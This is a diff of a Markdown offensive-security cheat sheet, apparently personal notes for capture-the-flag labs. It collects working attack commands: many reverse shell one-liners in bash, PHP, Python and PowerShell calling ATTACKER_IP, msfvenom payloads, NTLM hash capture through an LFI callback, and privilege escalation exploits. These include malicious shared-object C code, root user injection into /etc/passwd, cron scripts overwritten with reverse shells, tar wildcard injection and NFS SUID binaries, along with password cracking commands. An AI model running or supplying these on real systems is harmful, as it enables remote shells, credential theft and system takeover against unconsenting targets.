+db_nmap <nmap_options> <target>
 db_connect
 db_disconnect
 db_export
 db_import
-db_nmap <nmap_options> <target>
 db_rebuild_cache
 db_remove
 db_save
@@ -621,18 +791,12 @@ services
 vulns
 workspace
 
-# Common tasks in Metasploit
-use <module/path>
-show options
-run
-exploit
-
 # Using database hosts for a module
 hosts -R
 services -S <search_term>
 ```
 
-### Msfvenom
+### 🎯 Msfvenom
 
 - **Note:** stageless payloads user underscores in the name '_' like `shell_reverse_tcp`
 
@@ -655,7 +819,7 @@ msfvenom -p php/meterpreter_reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f ra
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f asp > rev_shell.asp
 msfvenom -p cmd/unix/reverse_python LHOST=<TARGET> LPORT=<TARGET_PORT> -f raw > rev_shell.py
 ```
-### Scans
+### 🔍 Scans
 
 ```bash
 # === Discovery Scans ===
@@ -690,35 +854,77 @@ auxiliary/scanner/http/http_options
 ## 🐚 Reverse & Bind Shells
 
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
-- https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 - https://github.com/danielmiessler/SecLists/tree/master/Web-Shells
 
 ### 💻 Shell One-Liners
 
-- typically `sudo` is required for ports below 1024
-- RECOMMENDED: 80, 443 or 53
+- RECOMMENDED: 53, 80, 139, 443, 445 or 8080
+    - Target -> Attacker (**callback**)
     - likely to bypass firewalls
-
-#### 👂 LISTENER
+    - `sudo` is required for ports <1024
 
 ```bash
-nc -vnlp <PORT>
+# Check if a flavor of netcat exists
+{ command -v nc && command -v netcat && command -v ncat ; } 2>/dev/null ; if command -v busybox >/dev/null; then busybox nc -h 2>/dev/null | head -n 1 && echo "'busybox nc' exists."; fi
+```
+#### 📞 Reverse Shells
+
+##### 👂 Local: LISTENER
+
+```bash
+rlwrap nc -vnlp <PORT>
 ```
 
-#### 📞 CALLBACK Shells
+##### 📞 Target: CALLBACK
 
 ```bash
-# Simple bash reverse shell
-bash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1
-
-# Python reverse shell
-python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<KALI_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
-
 # Reverse shell using a named pipe (fifo)
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <KALI_IP> <PORT> > /tmp/f
 ```
 
-### 🐘 PHP Webshell
+#### 🔗 Forward Shells
+
+##### 🔗 Target: BIND
+
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 <PORT> > /tmp/f
+```
+
+##### 🔗 Target: CONNECT
+
+```bash
+nc -nv <TARGET> <PORT>
+```
+
+#### 🐚 Other Shells to port 443
+
+| Language/Tool      | Command                                                                                                                                                                                                                       | Description                                                                                            |
+| :----------------- | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | :----------------------------------------------------------------------------------------------------- |
+| **Bash**           |                                                                                                                                                                                                                               |                                                                                                        |
+| Bash               | `bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'`                                                                                                                                                                          | The most common interactive bash reverse shell. Redirects standard output and error over a TCP socket. |
+| Bash               | `exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 \| while read line; do $line 2>&5 >&5; done`                                                                                                                                       | Creates a new file descriptor (5) for the TCP socket and executes commands received in a loop.         |
+| Bash               | `0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196`                                                                                                                                                            | Uses a specific file descriptor (196) to manage the I/O for the reverse shell connection.              |
+| Bash               | `bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5`                                                                                                                                                                         | Creates an interactive shell and redirects stdin, stdout, and stderr through file descriptor 5.        |
+| **PHP**            |                                                                                                                                                                                                                               |                                                                                                        |
+| PHP (`exec`)       | `php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'`                                                                                                                                                        | Opens a TCP socket and uses the `exec()` function to execute a shell.                                  |
+| PHP (`shell_exec`) | `php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'`                                                                                                                                                  | Similar to the above, but uses the `shell_exec()` function.                                            |
+| PHP (`system`)     | `php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'`                                                                                                                                                      | Uses the `system()` function to execute the shell and display the output.                              |
+| PHP (`passthru`)   | `php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'`                                                                                                                                                    | Uses the `passthru()` function, which is useful for binary data.                                       |
+| PHP (`popen`)      | `php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'`                                                                                                                                                  | Uses `popen()` to open a process pipe and execute the shell.                                           |
+| **Python**         |                                                                                                                                                                                                                               |                                                                                                        |
+| Python             | `export RHOST="ATTACKER_IP"; export RPORT=443; python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'`  | Sets attacker info as environment variables, then connects and spawns a fully interactive PTY shell.   |
+| Python             | `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'` | A very common and reliable one-liner that connects and spawns a PTY shell.                             |
+| Python             | `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'`                                                                                 | A more compact version of the standard Python PTY reverse shell.                                       |
+| **Other Tools**    |                                                                                                                                                                                                                               |                                                                                                        |
+| Telnet             | `TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF \| sh 1>$TF`                                                                                                                                                     | Creates a named pipe (FIFO) and uses `telnet` to shuttle shell I/O to the attacker.                    |
+| AWK                | `awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; ...}' /dev/null`                                                                                                                                                              | Uses AWK's built-in networking capabilities to create a reverse shell client.                          |
+| BusyBox            | `busybox nc ATTACKER_IP 443 -e sh`                                                                                                                                                                                            | Uses the `nc` applet within BusyBox with the `-e` flag to execute a shell upon connection.             |
+
+### 🐘 PHP Webshells
+
+- Beachhead: https://github.com/flozz/p0wny-shell
+- Post-Exploit: https://github.com/wso-shell-php/.github
 
 `/usr/share/webshells`
 - https://github.com/payloadbox/command-injection-payload-list
@@ -749,30 +955,46 @@ nc -lvnp 54321
 ?>
 ```
 
-### Windows Webshell
+### 🪟 Windows Webshell
 
 ```powershell
 # REPLACE <IP> and <PORT>
 powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
 ```
 
-# 🛠️ Post-Exploitation
+## 🛠️ Post-Exploitation
 
 Post-exploitation focuses on maintaining access, gathering information, escalating privileges, and preparing for lateral movement.
 
-## ⬆️ Shell Upgrades (Stabilization)
+## 🛑 Responder - NTLM Hash Capture
 
-### Python Method
+```bash
+# Configure listening services in: /etc/responder/Responder.conf
+sudo responder -I <INTERFACE>
+
+# Trigger NTLM authentication via LFI vulnerability
+curl -o- <URL>/index.php?page=//<CALLBACK_IP>/somefile
+
+# Capture NTLMv2-SSP Hash format: <USER>:<HOST>:<HASH>...
+
+# Use evil-winrm to access machine with captured credentials
+evil-winrm -i <HOST> -u <USER> -p <PASSWORD>
+
+# Search for flags on Windows
+Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Name flag.txt
+```
+
+## ⬆️ Shell Upgrades
+
+Upgrade a simple shell to a more interactive PTY.
+
+### 🐍 Python Method
 
 ```bash
 # === STEP 1 ===
 
-# Upgrade a simple shell to a more interactive PTY
-python2 -c 'import pty; pty.spawn("/bin/sh")'
-python2 -c 'import pty; pty.spawn("/bin/bash")'
-
-python3 -c 'import pty; pty.spawn("/bin/sh")'
-python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Terminal
+for i in python3 python python2; do command -v "$i" >/dev/null && "$i" -c 'import pty; pty.spawn("/bin/bash")' && exit; done
 
 # Meterpreter
 execute -f 'python -c "import pty; pty.spawn(\"/bin/bash\")"' -i -t
@@ -789,25 +1011,24 @@ CTRL+Z (background)
 # Stabilize a shell from terminal escape commands
 stty raw -echo; fg
 
+# === OPTIONAL ===
+
+echo "stty rows $(tput lines) columns $(tput cols)"
+stty rows <ABOVE> columns <ABOVE>
+
 # === SHELL DIES ===
+
 reset  # to re-enable disabled echo
 ```
 
-#### Resize Terminal
+#### 📏 Resize Terminal
 
 ```bash
 # RUN THIS OUTSIDE of remote shell
 # THEN run the output inside the remote shell
 stty size | awk '{printf "stty rows %s cols %s\n", $1, $2}'
-# or
+# --- OR ---
 stty -a | grep -o "rows [0-9]*; columns [0-9]*" | awk '{print "stty", $2, $4}'
-```
-
-### `rlwrap` Method
-
-```bash
-# Must wrap listener beforehand
-rlwrap nc -lvnp <PORT>
 ```
 
 ### 🔧 Socat Method
@@ -818,17 +1039,18 @@ rlwrap nc -lvnp <PORT>
 #====================================================================
 # STEP 1: ATTACKER - One-Time Setup (Get & Serve socat)
 #====================================================================
-cd /tmp
-# Download static Linux binary if needed
-wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x88_64/socat
-# (Assume you have socat.exe in the same directory for Windows targets)
 
+cd /tmp
+# Download static Linux binary
+wget -v https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
 # Get your IP and serve the directory on port 80
 ip a ; sudo python3 -m http.server 80
 
 #====================================================================
 # A) STANDARD (Unencrypted) SHELLS
 #====================================================================
+
+wget http://<ATTACKER_IP>/socat
 
 #--------------------------------------------------------------------
 # LINUX TARGET (Fully Stable TTY Shell)
@@ -838,9 +1060,9 @@ ip a ; sudo python3 -m http.server 80
 socat file:`tty`,raw,echo=0 tcp-listen:<PORT>
 
 # LINUX TARGET (Connect Back):
-curl http://<KALI_IP>:80/socat -o /tmp/socat
+wget http://<KALI_IP>:80/socat -o /tmp/socat
 chmod +x /tmp/socat
-/tmp/socat tcp-connect:<KALI_IP>:<PORT> exec:'bash -li',pty,stderr,setsid,sigint,sane
+nohup /tmp/socat tcp-connect:<KALI_IP>:<PORT> exec:'bash -li',pty,stderr,setsid,sigint,sane > /dev/null 2>&1 &
 
 #--------------------------------------------------------------------
 # WINDOWS TARGET (Simple Shell)
@@ -889,7 +1111,7 @@ socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
 C:\\Windows\temp\socat.exe EXEC:powershell.exe,pipes OPENSSL:<KALI_IP>:<PORT>,verify=0
 ```
 
-## Netcat and PowerShell shells
+## 🐚 Netcat and PowerShell shells
 
 ```bash
 # === REVERSE SHELL ===
@@ -913,7 +1135,7 @@ nc -lvnp <PORT> -e /bin/bash
 nc.exe -lvnp <PORT> -e cmd.exe
 
 # ATTACKER (Connect):
-nc <TARGET_IP> <PORT>
+nc <TARGET> <PORT>
 
 # === NETCAT SHELLS (Modern Linux, without -e flag) ===
 
@@ -930,7 +1152,7 @@ mkfifo /tmp/f; nc <ATTACKER_IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/
 mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 
 # ATTACKER (Connect):
-nc <TARGET_IP> <PORT>
+nc <TARGET> <PORT>
 
 # --- POWERSHELL REVERSE SHELL (Windows Only) ---
 
@@ -943,8 +1165,6 @@ powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>'
 ```
 
 ## 🐧 Linux Survey
-
-- https://gtfobins.github.io/
 
 ```bash
 #!/bin/bash
@@ -978,6 +1198,13 @@ echo -e "\n===== LINUX CAPABILITIES (MODERN PRIVESC) =====";
 echo "Check GTFOBins for any binary with '+ep' privileges.";
 getcap -r / 2>/dev/null;
 
+# --- [NEW] Section for explicit, high-impact file permission checks ---
+echo -e "\n===== CRITICAL FILE PERMISSIONS =====";
+echo "--- /etc/passwd ---";
+ls -la /etc/passwd;
+echo "--- /etc/shadow ---";
+ls -la /etc/shadow;
+
 echo -e "\n===== WORLD-WRITABLE FILES & DIRECTORIES =====";
 find / -type d -perm -0002 -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null;
 find / -type f -perm -0002 -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null;
@@ -1000,14 +1227,41 @@ done;
 echo -e "\n===== RUNNING PROCESSES =====";
 ps aux;
 
+# --- [ENHANCED] Section now checks permissions of scheduled tasks ---
 echo -e "\n===== CRON JOBS / SCHEDULED TASKS =====";
 ls -la /etc/cron*;
+echo -e "\n--- /etc/crontab Contents ---";
 cat /etc/crontab;
+echo -e "\n--- Checking Permissions of Scripts in /etc/crontab ---";
+# This part parses crontab, finds the commands, and checks if they are writable
+while read -r line; do
+    # Ignore comments and empty lines
+    if [[ "$line" =~ ^\s*# || -z "$line" ]]; then
+        continue
+    fi
+    # Extract the command part of the line
+    cmd=$(echo "$line" | awk '{for(i=6;i<=NF;i++) printf "%s ", $i; print ""}')
+    # Find the full path of the command
+    cmd_path=$(which $cmd 2>/dev/null)
+    if [ -n "$cmd_path" ] && [ -w "$cmd_path" ]; then
+        echo "[!!!] VULNERABLE: Cron job command is writable: $cmd_path"
+        ls -la "$cmd_path"
+    fi
+done < <(grep -vE '^PATH=' /etc/crontab)
 
 echo -e "\n===== NETWORK INFO & OPEN PORTS (LOCAL) =====";
 # Failsafe: Tries to use netstat, but falls back to ss if it's not available.
 command -v netstat &>/dev/null && netstat -tulpn || ss -tulpn;
 
+# --- [NEW] Section for NFS share enumeration ---
+echo -e "\n===== NFS SHARES =====";
+echo "--- /etc/exports (Server-side config) ---";
+cat /etc/exports 2>/dev/null || echo "Not found.";
+echo -e "\n--- showmount (Client-side check) ---";
+command -v showmount &>/dev/null && showmount -e 127.0.0.1 || echo "showmount command not found.";
+
+# Note: The -n flag makes this non-interactive. It will only show sudo rights
+# if the user has NOPASSWD configured. A manual 'sudo -l' is still recommended.
 echo -e "\n===== CAN I RUN SUDO? (NON-INTERACTIVE CHECK) =====";
 sudo -n -l;
 
@@ -1031,46 +1285,232 @@ scp -P <PORT> <USER>@<IP_ADDR>:/tmp/linux_survey_output.txt /tmp/
 
 Sometimes, some routers or mini-environments might not have the full core utils suite. As long as `/proc/net` is readable, then it is also parsable with the following monstrosity.
 
-### 🔌 TCP and TCP6 Manual Netstat (no UDP)
+### 🔌 TCP and TCP6 /proc Netstat (no UDP)
 
 ```bash
 { printf "%-8s %-22s %-22s %-12s %s\n" "Proto" "Local Address" "Remote Address" "State" "PID/Program Name"; awk 'function hextodec(h,r,i,c,v){h=toupper(h);r=0;for(i=1;i<=length(h);i++){c=substr(h,i,1);if(c~/[0-9]/)v=c;else v=index("ABCDEF",c)+9;r=r*16+v}return r} function hextoip(h,ip,d1,d2,d3,d4){if(length(h)==8){d1=hextodec(substr(h,7,2));d2=hextodec(substr(h,5,2));d3=hextodec(substr(h,3,2));d4=hextodec(substr(h,1,2));return d1"."d2"."d3"."d4}if(length(h)>8){if(hextodec(h)==0)return"::";if(substr(h,1,24)=="0000000000000000FFFF0000"){h=substr(h,25,8);d1=hextodec(substr(h,7,2));d2=hextodec(substr(h,5,2));d3=hextodec(substr(h,3,2));d4=hextodec(substr(h,1,2));return"::ffff:"d1"."d2"."d3"."d4}return h}} NR>1{split($2,l,":");split($3,r,":");lip=hextoip(l[1]);lport=hextodec(l[2]);rip=hextoip(r[1]);rport=hextodec(r[2]);sm["01"]="ESTABLISHED";sm["0A"]="LISTEN";if($4 in sm){if(FILENAME~/tcp6/)p="tcp6";else p="tcp";printf"%-8s %-22s %-22s %-12s %s\n",p,lip":"lport,rip":"rport,sm[$4],$10}}' /proc/net/tcp /proc/net/tcp6 | while read proto laddr raddr state inode; do find_output=$(find /proc -path '*/fd/*' -lname "socket:\[$inode\]" -print -quit 2>/dev/null); if [ -n "$find_output" ]; then pid=$(echo "$find_output" | cut -d'/' -f3); pname=$(cat /proc/$pid/comm 2>/dev/null); printf "%-8s %-22s %-22s %-12s %s/%s\n" "$proto" "$laddr" "$raddr" "$state" "$pid" "$pname"; else printf "%-8s %-22s %-22s %-12s %s\n" "$proto" "$laddr" "$raddr" "$state" "-"; fi; done | sort -k4; }
 ```
 
 ## ⬆️ Privilege Escalation (PrivEsc)
+
+### 🔧 SUDO Escalation
+
+#### Sudo Shell Escapes (GTFOBins)
 ```bash
-# List your sudo privileges
+# Identification: Check for binaries the user can run with NOPASSWD
 sudo -l
 
-# Find all files with SUID permission set
-find / -perm -u=s -type f 2>/dev/null
+# === Exploitation: Find the binary on GTFOBins ===
+# https://gtfobins.github.io/
 
-# Upgrade to a root shell from vim (if sudo allows)
-sudo vim -c ':!/bin/bash'
+# Exploit w/ 'find'
+sudo find . -exec /bin/sh \; -quit
+
+# Exploit w/ 'awk'
+sudo awk 'BEGIN {system("/bin/sh")}'
+
+# Exploit w/ 'vim'
+sudo vim -c ':!/bin/sh'
+```
+
+#### Sudo with LD_PRELOAD / LD_LIBRARY_PATH
+```bash
+# Identification: Check if env_keep preserves LD_PRELOAD or LD_LIBRARY_PATH
+sudo -l | grep 'env_keep.*LD_'
+
+# Exploitation (LD_PRELOAD):
+# 1. Create malicious shared object file
+echo '#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0); setuid(0);
+    system("/bin/bash -p");
+}' > /tmp/preload.c
+
+# 2. Compile the .so file
+gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c
+
+# 3. Run sudo command with preloaded library
+sudo LD_PRELOAD=/tmp/preload.so <command_from_sudo-l>
+```
+
+### 🔒 File Permissions & Attributes
+
+#### SUID/SGID - Shared Object (.so) Injection
+```bash
+# Identification: Find custom SUID/SGID binaries
+find / -type f -perm -u=s 2>/dev/null
+
+# Use strace to see if it loads non-existent .so files from writable paths
+strace /path/to/suid-binary 2>&1 | grep -iE "open.*\.so.*no such file"
+
+# Exploitation:
+# 1. Create malicious .so file with discovered name
+echo '#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+void _init() {
+    setgid(0); setuid(0);
+    system("/bin/bash -p");
+}' > /path/to/writable/dir/hijacked.so
+
+# 2. Compile it
+gcc -shared -fPIC -o /path/to/writable/dir/hijacked.so /path/to/writable/dir/hijacked.so.c
+
+# 3. Run the SUID binary (will load your malicious library)
+/path/to/suid-binary
+```
+
+#### Capabilities Escalation
+```bash
+# Identification: Search for binaries with capabilities set
+getcap -r / 2>/dev/null
+// cap_setuid+ep
+
+# --- Exploitation: If set, use it to become root ---
+
+# vim example
+vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "bash", "-p")'
+```
+
+#### Writable System Files
+```bash
+# Exploitation (/etc/passwd):
+# 1. Generate password hash for new root user
+openssl passwd -1 -salt <USERNAME> <PASSWORD>
+
+# 2. Add new user with UID 0 to /etc/passwd
+echo 'newroot:<HASH_HERE>:0:0:root:/root:/bin/bash' >> /etc/passwd
+
+# 3. Log in
+su newroot
+
+# Exploitation (/etc/shadow):
+# 1. Generate SHA-512 hash for root user
+openssl passwd -6 <PASSWORD>
+
+# 2. Replace root hash in /etc/shadow (requires write method)
+```
+
+#### Readable /etc/shadow
+```bash
+# Identification: Check if /etc/shadow is world-readable
+ls -la /etc/shadow
+
+# Exploitation:
+# 1. Copy passwd and shadow files
+cp /etc/passwd .
+cp /etc/shadow .
+
+# 2. Combine for John the Ripper
+unshadow passwd shadow > hashes.txt
+
+# 3. Crack the hashes
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+```
+
+### ⏰ Scheduled Tasks (Cron Jobs)
+
+#### Writable Cron Script
+```bash
+# Identification: Check for writable scripts run by root cron jobs
+cat /etc/crontab
+ls -la /path/to/script.sh
+
+# Exploitation: Overwrite script with reverse shell payload
+echo '#!/bin/bash' > /path/to/script.sh
+echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' >> /path/to/script.sh
+# Wait for cron job to execute
+```
+
+#### Cron PATH Hijacking
+```bash
+# Identification: Root cron job uses relative path in writable directory
+cat /etc/crontab
+
+# Exploitation: Create malicious script with same name in writable directory
+echo '#!/bin/bash' > /home/user/backup.sh
+echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' >> /home/user/backup.sh
+chmod +x /home/user/backup.sh
+# Wait for cron job to run
+```
+
+#### Cron Wildcard Injection
+```bash
+# Identification: Root cron job runs command with wildcard in writable directory
+# Example: cd /home/user && tar czf /backups/archive.tar.gz *
+cat /etc/crontab
+
+# Exploitation:
+# 1. Create reverse shell payload
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell
+
+# 2. Create specially named files to exploit wildcard and tar's checkpoint feature
+touch '--checkpoint=1'
+touch '--checkpoint-action=exec=./shell'
+```
+
+### 🌐 Network Services (NFS)
+
+#### NFS with no_root_squash
+```bash
+# Identification (on Attacker Machine):
+showmount -e <TARGET>
+
+# Exploitation (on Attacker Machine):
+# 1. Create mount point and mount the share
+mkdir /tmp/nfs_mount
+sudo mount -o rw <TARGET>:<SHARE_PATH> /tmp/nfs_mount
+
+# 2. Create malicious C file on the mount
+echo '#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+void main() {
+    setuid(0); setgid(0);
+    system("/bin/bash -p");
+}' > /tmp/nfs_mount/shell.c
+
+# 3. Compile the file
+sudo gcc /tmp/nfs_mount/shell.c -o /tmp/nfs_mount/shell
+
+# 4. Set SUID bit on compiled binary
+sudo chmod +s /tmp/nfs_mount/shell
+
+# 5. Unmount the share
+sudo umount /tmp/nfs_mount
+
+# Exploitation (on Target Machine):
+# Log in as normal user and execute SUID binary from share
+<SHARE_PATH>/shell
 ```
 
 ### 🔍 Linpeas Enumerator
 
 * https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
 * https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/
+* https://gtfobins.github.io/
 
 ```bash
 # KALI
 cd /tmp
 wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
-ip a
-python3 -m http.server 8000
+ip a ; python3 -m http.server 8000
 
 # TARGET
 cd /tmp
 wget http://<IP_ADDR>:8000/linpeas.sh
 chmod +x linpeas.sh
-./linpeas.sh 2>&1 | tee linpeas_output.txt
+REGEXES="0" ./linpeas.sh 2>&1 | tee linpeas_output.txt
 ```
 
 ```bash
 # Retrieve survey
-scp -P <PORT> <USER>@<IP_ADDR>:/tmp/linpeas_output.txt /tmp/
+scp -P <PORT> <USER>@<IP_ADDR>:/tmp/linpeas_output.txt ~/
 ```
 
 ### 🚨 CVE-2021-4034 - Pkexec Local Privilege Escalation (privesc)
@@ -1086,21 +1526,11 @@ chmod +x PwnKit
 ./PwnKit
 ```
 
-## 🔐 SSH / SCP
+## 🔐 sshpass
 
-### 🔗 Connecting and Transferring Files
 ```bash
 # SSH into a target using a password with sshpass (non-interactive)
 sshpass -p '<PASSWORD>' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 <USER>@<TARGET>
-
-# SSH into a target using a private key identity file
-ssh -i /path/to/private_key <USER>@<TARGET>
-
-# TARGET_FILE -> KALI
-scp <USER>@<TARGET>:/remote/path/to/file /local/path/
-
-# KALI_FILE -> TARGET
-scp /local/path/to/file <USER>@<TARGET>:/remote/path/
 ```
 
 ## 🔓 Password Cracking
@@ -1111,8 +1541,24 @@ scp /local/path/to/file <USER>@<TARGET>:/remote/path/
 ssh2john /path/to/id_rsa > /path/to/hash.txt
 
 # Crack a hash file using a wordlist with John the Ripper
-john --wordlist=/usr/share/wordlists/rockyou.txt /path/to/hash.txt
+# John will attempt to guess the hash type, but specifiying the FORMAT is recommended
+john --list=formats
+# john --format=NT
+# john --format=raw-md5
+# john --format=sha512crypt
+john --format=<FORMAT> --wordlist=/usr/share/wordlists/rockyou.txt /path/to/hash.txt
+# Single crack mode: makes permutations given a username
+# bobby:1234567890ABCDEF
+john --single --format=<FORMAT> /path/to/hash.txt
+# Zipfiles
+zip2john <ZIP_FILE> > hash_zip.txt
+# RARfiles
+rar2john <ZIP_FILE> > hash_rar.txt
+# SSH id_rsa
+ssh2john <ID_RSA> > hash_id_rsa.txt
 ```
+
+- https://hashcat.net/wiki/doku.php?id=example_hashes
 
 ```bash
 # Crack an MD5crypt hash with a salt using Hashcat
@@ -1122,9 +1568,85 @@ hashcat -O -a 0 -m 20 <HASH>:<SALT> /usr/share/wordlists/rockyou.txt
 hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
-## 🍃 MongoDB
+## 🍃 Databases
 
-### 💾 Interacting with the Database
+### 🗄️ SQL
+
+| Command                                   | Description                                                     | Example                                                         |
+| :---------------------------------------- | :-------------------------------------------------------------- | :-------------------------------------------------------------- |
+| **DATABASE & TABLE MGMT**                 |                                                                 |                                                                 |
+| `CREATE DATABASE db_name;`                | Creates a new database.                                         | `CREATE DATABASE thm_bookmarket_db;`                            |
+| `SHOW DATABASES;`                         | Lists all available databases.                                  | `SHOW DATABASES;`                                               |
+| `USE db_name;`                            | Switches the active context to a specific database.             | `USE thm_bookmarket_db;`                                        |
+| `DROP DATABASE db_name;`                  | Deletes an entire database.                                     | `DROP DATABASE old_db;`                                         |
+| `CREATE TABLE table_name (...);`          | Creates a new table with specified columns and data types.      | `CREATE TABLE books (id INT, name VARCHAR(255));`               |
+| `SHOW TABLES;`                            | Lists all tables in the currently active database.              | `SHOW TABLES;`                                                  |
+| `DESCRIBE table_name;`                    | Shows the structure of a table (columns, data types, etc.).     | `DESCRIBE book_inventory;`                                      |
+| `ALTER TABLE table_name ADD ...;`         | Modifies an existing table, such as adding a new column.        | `ALTER TABLE books ADD page_count INT;`                         |
+| `DROP TABLE table_name;`                  | Deletes an entire table.                                        | `DROP TABLE old_books;`                                         |
+| **CRUD OPERATIONS**                       |                                                                 |                                                                 |
+| `INSERT INTO table (...) VALUES (...);`   | Adds a new record (row) into a table.                           | `INSERT INTO books (id, name) VALUES (1, 'New Book');`          |
+| `SELECT columns FROM table;`              | Retrieves data (reads records) from a table.                    | `SELECT name, description FROM books;`                          |
+| `SELECT * FROM table;`                    | Retrieves all columns for all records in a table.               | `SELECT * FROM books;`                                          |
+| `UPDATE table SET col=val WHERE ...;`     | Modifies existing records in a table.                           | `UPDATE books SET name = 'Updated Name' WHERE id = 1;`          |
+| `DELETE FROM table WHERE ...;`            | Removes records from a table.                                   | `DELETE FROM books WHERE id = 1;`                               |
+| **CLAUSES**                               |                                                                 |                                                                 |
+| `SELECT DISTINCT column ...;`             | Returns only unique values from a column, removing duplicates.  | `SELECT DISTINCT category FROM books;`                          |
+| `... GROUP BY column;`                    | Groups rows that have the same values into summary rows.        | `SELECT category, COUNT(*) FROM books GROUP BY category;`       |
+| `... ORDER BY column ASC;`                | Sorts the result set in ascending order.                        | `SELECT * FROM books ORDER BY name ASC;`                        |
+| `... ORDER BY column DESC;`               | Sorts the result set in descending order.                       | `SELECT * FROM books ORDER BY published_date DESC;`             |
+| `... HAVING condition;`                   | Filters results after aggregation (used with `GROUP BY`).       | `... GROUP BY category HAVING COUNT(*) > 5;`                    |
+| **OPERATORS**                             |                                                                 |                                                                 |
+| `... WHERE column LIKE 'pattern';`        | Searches for a specified pattern in a column (`%` is wildcard). | `WHERE description LIKE '%guide%';`                             |
+| `... WHERE condition1 AND condition2;`    | Returns records only if both conditions are true.               | `WHERE category = 'Hacking' AND published_date > '2020-01-01';` |
+| `... WHERE condition1 OR condition2;`     | Returns records if at least one of the conditions is true.      | `WHERE name = 'BookA' OR name = 'BookB';`                       |
+| `... WHERE NOT condition;`                | Excludes records that meet a specific condition.                | `WHERE NOT category = 'Hacking';`                               |
+| `... WHERE column BETWEEN val1 AND val2;` | Selects values within a given range (inclusive).                | `WHERE id BETWEEN 10 AND 20;`                                   |
